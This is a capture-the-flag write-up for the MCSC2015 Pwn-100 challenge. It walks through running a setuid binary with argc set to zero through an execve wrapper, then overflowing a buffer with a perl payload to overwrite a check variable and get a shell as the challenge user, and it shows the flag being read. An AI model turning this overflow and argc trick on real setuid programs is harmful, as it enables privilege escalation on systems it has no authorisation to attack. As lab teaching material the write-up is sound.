\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#<br>
MCSC2015 writeup for Pwn-100<br>
\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#<br>

pwn0@MCSC2015:/challenges/pwn0$ ls -l<br>
total 16<br>
-rws--s--x 1 pwned0 pwned0 7492 mai   18 15:13 0<br>
-r-------- 1 pwned0 pwned0   52 mai   18 15:13 FLAG<br>
-rw-r--r-- 1 root   root    558 mai   18 15:13 pwn0.c<br>
<br>
after a quick view in pwn0.c, here's an interesting function<br>
<br>
void vuln()<br>
{<br>
	unsigned int reg;<br>
	char buffer[BUFF_SIZE];<br>
	fgets(buffer , BUFF_SIZE+5 , stdin);<br>
	if(reg == 78954)<br>
	{<br>
		printf("You Win\n");<br>
		system("/bin/dash");<br>
	}<br>
}<br>
<br>
However, this function is executed if and only if argc is equal to zero.<br>
In that case, execve can be handy ...<br>
<br>
<br>
Step 1 : run the program with argc equals to zero to allow the function vuln() to be executed.<br>
Step 2 : overwrite the variable reg with 78954<br>
if(reg == 78954)<br>
{<br>
	printf("You Win\n");<br>
	system("/bin/dash");<br>
}<br>
\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#<br>
Step1 : run a program with argc=0<br>
What's special about the family exec call system ?<br>
execve allows you to specify the command-line arguments (including the program name).<br>
a normal call to execve for example would be :<br>
execve("/home/xxx/prog","prog",NULL) witch is similar to /home/xxx/prog with argc equals to 1 as usual ....<br>
execve("/home/xxx/prog",NULL,NULL) would be a little bit different .... argc is equal to zero in that case.<br>
<br>
with that said, let's start exploiting .....<br>
First, we write a small program <br>
\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#<br>
\#include \<stdio.h><br>
\#include \<stdlib.h><br>
int main()<br>
{<br>
	execve("/challenges/pwn0/0",NULL,NULL);<br>
}<br>
\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#<br>
pwn0@MCSC2015:/tmp$ mkdir /tmp/testing<br>
pwn0@MCSC2015:/tmp$ cd /tmp/testing/<br>
pwn0@MCSC2015:/tmp/testing$ cat wrapper.c<br>
\#include \<stdio.h><br>
\#include \<stdlib.h><br>
int main()<br>
{<br>
	execve("/challenges/pwn0/0",NULL,NULL);
}
pwn0@MCSC2015:/tmp/testing$ gcc wrapper.c -o wrapper
pwn0@MCSC2015:/tmp/testing$ ./wrapper 
Good Boy
test
pwn0@MCSC2015:/tmp/testing$

we are finally able to execute the vuln() function, let's try to exploit it:
The buffer size is 64, 78954 to hexadecimal is 0x1346A
===========================
A successful exploitation would be like this:
pwn0@MCSC2015:/challenges/pwn0$ perl -e 'print "A"x64 . "\x6a\x34\x01\x00"' > /tmp/testing/input
pwn0@MCSC2015:/challenges/pwn0$ cat /tmp/testing/input -|/tmp/testing/wrapper 
Good Boy
You Win
id      
uid=1001(pwn0) gid=1001(pwn0) euid=1002(pwned0) egid=1002(pwned0) groups=1002(pwned0),1001(pwn0)
cat FLAG
flaG{I_4M_Th3_EaSy_One_Pwn_th3_N3xt_L3vel_If_U_C4N}
